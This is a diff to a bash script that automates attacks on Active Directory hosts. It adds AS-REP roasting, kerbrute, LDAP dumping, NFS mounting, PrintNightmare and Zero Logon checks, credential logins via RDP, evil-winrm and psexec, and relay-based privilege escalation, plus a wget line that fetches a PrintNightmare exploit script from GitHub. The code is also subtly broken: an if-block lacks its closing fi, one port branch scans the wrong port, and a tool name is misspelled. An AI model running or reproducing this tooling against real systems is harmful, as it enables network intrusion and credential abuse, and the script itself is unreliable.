@@ -136,11 +136,21 @@ if [ $USER ] && [ $PASS ]
 then
 	read -p "Since you provided username and password would like to try ldapdomaindump? (y/n)" answer
 	if [ $answer = y ] ; then
-		echo "Making $DOMAINIP.ldap directory"
-		mkdir $DOMAINIP.ldap
-		ldapdomaindump -u $USER -p $PASS $DOMAINIP
-		cd ..
-		echo "May want to check out $DOMAINIP.ldap directory to see if there is anything useful in there"
+		read -p "Do you need to install ldapdomaindump? (y/n)" answer
+		if [ $answer = y ] ; then
+			sudo pip install ldapdomaindump
+			sudo pip install ldap3
+			sudo pip install dnspython
+			sudo apt update
+		elif [ $answer = n ] ; then
+			echo "Making $DOMAINIP.ldap directory"
+			mkdir $DOMAINIP.ldap
+			ldapdomaindump -u $USER -p $PASS $DOMAINIP
+			cd ..
+			echo "May want to check out $DOMAINIP.ldap directory to see if there is anything useful in there"
+		else
+			echo echo -e '\E[31;35m' "Need a y or n"
+		fi
 	else 
 		echo "Continuing Script"
 	fi
@@ -149,7 +159,7 @@ fi
 if grep 88/tcp $DOMAINIP.txt
 then
 	echo "IP may be a domain controller, port 88 is open"
-	read -p "Try one of the following (kerberoasting(ki)/kerbrute(kb)/all(a)/none(n) ex: ki)" answer
+	read -p "Would you like to try one of the following (kerberoasting(ki)/kerbrute(kb)/all(a)/none(n) ex: ki)?" answer
 	if [ $answer = ki ] ; then
 		GetNPUsers.py DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP >> $DOMAINIP.txt
 	elif [ $answer = kb ] ; then
@@ -180,7 +190,8 @@ sleep 1
 if grep 21/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "FTP is open running another scan on it"; tput sgr0
-	nmap -p 21 -sC -sV -vv $DOMAINIP -Pn >> $DOMAINIP.txt
+	nmap -p 21 -sC -sV -vv -n $DOMAINIP -Pn >> $DOMAINIP.txt
+	echo -e '\E[31;35m' "Check $DOMAINIP.txt to see if FTP allows anonymous access"; tput sgr0
 fi
 sleep 1
 
@@ -194,10 +205,15 @@ sleep 1
 if grep 389/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "LDAP is open trying ldapdomaindump and ldapsearch"; tput sgr0
+	echo -e '\E[31;35m' "Install ldapdomaindump if not already installed"
+	sudo pip install ldapdomaindump
+	sudo pip install ldap3
+	sudo pip install dnspython
 	echo -e '\E[31;35m' "Creating new directory to put any information found into $DOMAINIP.ldap"; tput sgr0
 	mkdir $DOMAINIP.ldap
 	cd $DOMAINIP.ldap
 	echo -e '\E[31;35m' "If information was dumped it will be in here"
+	pwd
 	ldapdomaindump ldap://$DOMAINIP:389
 	cd ..
 	ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)' >> $DOMAINIP.txt
@@ -218,7 +234,16 @@ then
 	nmap $DOMAINIP --script=http-vuln*,http-enum -p 80 -sC -sV -Pn >> $DOMAINIP.txt
 	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
 	if [ $answer = y ] ; then
-		feroxbuster -u http://$DOMAINIP -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		read -p "Do you want to install feroxbuster? (y/n)" answer
+		if [ $answer = n ] ; then
+			echo "Continuing"
+			feroxbuster -u http://$DOMAINIP -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		elif [ $answer = y ] ; then
+			sudo apt install feroxbuster
+			feroxbuster -u http://$DOMAINIP -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		else 
+			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
+		fi
 	elif [ $answer = n ] ; then
 		echo -e '\E[31;35m' "Continuing Script"
 	else
@@ -233,7 +258,16 @@ then
 	nmap $DOMAINIP --script=http-vuln*,http-enum -p 8080 -sC -sV -Pn >> $DOMAINIP.txt
 	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
 	if [ $answer = y ] ; then
-		feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		read -p "Do you want to install feroxbuster? (y/n)" answer
+		if [ $answer = n ] ; then
+			echo "Continuing"
+			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		elif [ $answer = y ] ; then
+			sudo apt install feroxbuster
+			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		else 
+			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
+		fi
 	elif [ $answer = n ] ; then
 		echo -e '\E[31;35m' "Continuing Script"
 	else
@@ -248,7 +282,16 @@ then
 	nmap $DOMAINIP --script=http-vuln*,http-enum -p 8888 -sC -sV -Pn >> $DOMAINIP.txt
 	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
 	if [ $answer = y ] ; then
-		feroxbuster -u http://$DOMAINIP:8888 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		read -p "Do you want to install feroxbuster? (y/n)" answer
+		if [ $answer = n ] ; then
+			echo "Continuing"
+			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		elif [ $answer = y ] ; then
+			sudo apt install feroxbuster
+			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+		else 
+			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
+		fi
 	elif [ $answer = n ] ; then
 		echo -e '\E[31;35m' "Continuing Script"
 	else
@@ -351,6 +394,20 @@ if grep 2049/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "NFS Share is running"; tput sgr0
 	showmount -e $DOMAINIP >> $DOMAINIP.txt
+	read -p "If you can see the mount would you like to try and mount to your own machine? (y/n)" answer
+	if [ $answer = y ] ; then
+		echo -e '\E[31;35m' "What is the share directory on $DOMAINIP?"; tput sgr0 
+		read DOMDIR
+		echo -e '\E[31;35m' "Making a directory mount and trying to $DOMAINIP.mount $DOMDIR"; tput sgr0
+		mkdir $DOMAINIP.mount
+		sudo mount -t nfs $DOMAINIP:$DOMDIR $DOMAINIP.mount
+		echo -e '\E[31;35m' "Done mounting, hopefully it worked"; tput sgr0
+	elif
+		[ $answer = n ] ; then
+			echo -e '\E[31;35m' "Not mounting, continuing script"; tput sgr0
+	else
+		echo -e '\E[31;35m' "Not an answer, need a y or n"; tput sgr0
+	fi
 fi
 sleep 1
 
@@ -364,6 +421,14 @@ sleep 1
 echo -e '\E[31;40m' "Testing if vulnerable to Print Nightmare"; tput sgr0
 impacket-rpcdump @$DOMAINIP | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
 impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
+read -p "If vulnerable would you like to download a PrintNightmare Script made by OvergrownCarrot1? (y/n)" answer
+if [ $answer = y ] ; then
+	wget https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/PrintNightmareScript.sh > PrintNightmareScript.sh
+	echo -e '\E[31;40m' "Saved script to PrintNightmareScript.sh"
+elif [ $answer = n ] ; then
+	echo -e '\E[31;40m' "Not downloading script"
+else
+	echo -e '\E[31;40m' "Need a y or n"
 sleep 1
 
 read -p "Test for Zero Logon? (y/n)" answer
@@ -388,36 +453,47 @@ if [ $answer = y ] ; then
 fi
 sleep 1
 
+if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
+then
+	read -p "Would you like to try and RDP in? (y/n)"
+	if [ $answer = y ] ; then
+		xfreerdp "/u:$DOMAIN\$USER" "/p:$PASS" /v:$DOMAINIP
+	else
+		echo -e '\E[31;40m' "Not trying RDP"
+	fi
+fi
+
 if grep 5985/tcp $DOMAINIP.txt
 then
 	read -p "Test for Evil-WinRM Login? (y/n)" answer
 	if [ $answer = y ] ; then
-		echo -e '\E[31;40m' "Username to test?"; tput sgr0
-		read EVILUSER
-		echo -e '\E[31;40m' "Password to use?"; tput sgr0
-		read EVILPASS
-		evil-winrm -u $EVILUSER -p $EVILPASS -i $DOMAINIP
+		evil-winrm -u $USER -p $PASS -i $DOMAINIP
 	elif [ $answer = n ] ; then
 		echo "Not trying Evil-WinRM Login"
+	else
+		echo "Not an answer"
 	fi
 fi
 sleep 1
 
 read -p "Test for PSExec Login (y/n)" answer
 if [ $answer = y ] ; then
-	echo -e '\E[31;40m' "Username to test?"; tput sgr0
-	read PSUSER
-	echo -e '\E[31;40m' "Password to test?"; tput sgr0
-	read PSPASS
-	psexec.py "$DOMAIN/$PSUSER:$PSPASS@$DOMAINIP"
+	psexec.py "$DOMAIN/$USER:$PASS@$DOMAINIP"
+elif [ $answer = n ]; then
+	echo "Not trying PSExec Login"
+else
+	echo "Not an answer"
 fi
 sleep 1
 
 read -p "Try and escalate user with ntlmrealyx.py? (y/n)" answer
 if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "User to test?"; tput sgr0
-	read NTLMUSER
-	ntlmrealyx.py -t ldap://$DOMAINIP --escalate-user $NTLMUSER
+	ntlmrealyx.py -t ldap://$DOMAINIP --escalate-user $USER
+elif [ $answer = n ]; then
+	echo "Not trying to escalate user"
+else
+	echo "Not an answer"
 fi
 sleep 1
 
